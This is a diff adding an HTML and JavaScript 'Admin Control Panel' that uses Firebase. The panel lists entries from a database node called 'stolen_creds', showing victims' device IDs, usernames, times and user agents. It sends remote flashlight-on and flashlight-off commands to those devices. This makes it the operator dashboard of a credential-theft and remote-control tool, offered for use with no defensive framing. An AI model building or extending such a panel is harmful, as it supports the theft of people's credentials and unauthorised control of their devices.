@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control Panel</title>
+    <style>
+        body { background: #0a0a0a; font-family: monospace; padding: 20px; color: #0f0; }
+        .container { max-width: 800px; margin: auto; background: #111; padding: 20px; border-radius: 20px; border: 1px solid #2a2a2a; }
+        h1 { font-size: 24px; border-bottom: 1px solid #2a6df4; display: inline-block; }
+        .device-card { background: #1e1e1e; margin: 16px 0; padding: 16px; border-radius: 16px; border-left: 4px solid #2a6df4; }
+        .device-id { font-weight: bold; color: #ffaa44; word-break: break-all; }
+        .creds { background: #000; padding: 8px; border-radius: 8px; font-size: 12px; margin-top: 8px; }
+        .btn-group { margin-top: 12px; display: flex; gap: 12px; }
+        button { background: #2a6df4; border: none; padding: 8px 18px; border-radius: 40px; color: white; font-weight: bold; cursor: pointer; }
+        button.danger { background: #6b2a2a; }
+        button:active { transform: scale(0.96); }
+        .refresh { margin-bottom: 20px; background: #333; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>⚡ ADMIN PANEL (TORCH CONTROL)</h1>
+    <button class="refresh" id="refreshBtn">⟳ Refresh Perangkat</button>
+    <div id="devicesList"></div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+<script>
+    const firebaseConfig = {
+        apiKey: "ISI_APIKEY_ANDA",
+        authDomain: "ISI_AUTHDOMAIN",
+        databaseURL: "ISI_DATABASE_URL",
+        projectId: "ISI_PROJECTID",
+        storageBucket: "ISI_STORAGEBUCKET",
+        messagingSenderId: "ISI_SENDERID",
+        appId: "ISI_APPID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    async function sendCommand(deviceId, command) {
+        await db.ref(`commands/${deviceId}`).set(command);
+        setTimeout(() => {
+            db.ref(`commands/${deviceId}`).remove(); // reset command
+        }, 500);
+    }
+
+    async function loadDevices() {
+        const snapshot = await db.ref('stolen_creds').once('value');
+        const creds = snapshot.val() || {};
+        const container = document.getElementById('devicesList');
+        container.innerHTML = '';
+        for (const [deviceId, data] of Object.entries(creds)) {
+            const card = document.createElement('div');
+            card.className = 'device-card';
+            card.innerHTML = `
+                <div class="device-id">📱 ID: ${deviceId}</div>
+                <div class="creds">🔐 User: ${data.username || '-'} | Time: ${new Date(data.time).toLocaleString()}<br>UA: ${data.userAgent?.substring(0, 60)}...</div>
+                <div class="btn-group">
+                    <button class="torch-on" data-id="${deviceId}">🔦 SENTER ON</button>
+                    <button class="torch-off" data-id="${deviceId}">⚫ SENTER OFF</button>
+                </div>
+            `;
+            container.appendChild(card);
+        }
+        // attach event listeners
+        document.querySelectorAll('.torch-on').forEach(btn => {
+            btn.onclick = () => sendCommand(btn.dataset.id, 'torch_on');
+        });
+        document.querySelectorAll('.torch-off').forEach(btn => {
+            btn.onclick = () => sendCommand(btn.dataset.id, 'torch_off');
+        });
+    }
+
+    document.getElementById('refreshBtn').onclick = loadDevices;
+    loadDevices();
+</script>
+</body>
+</html>
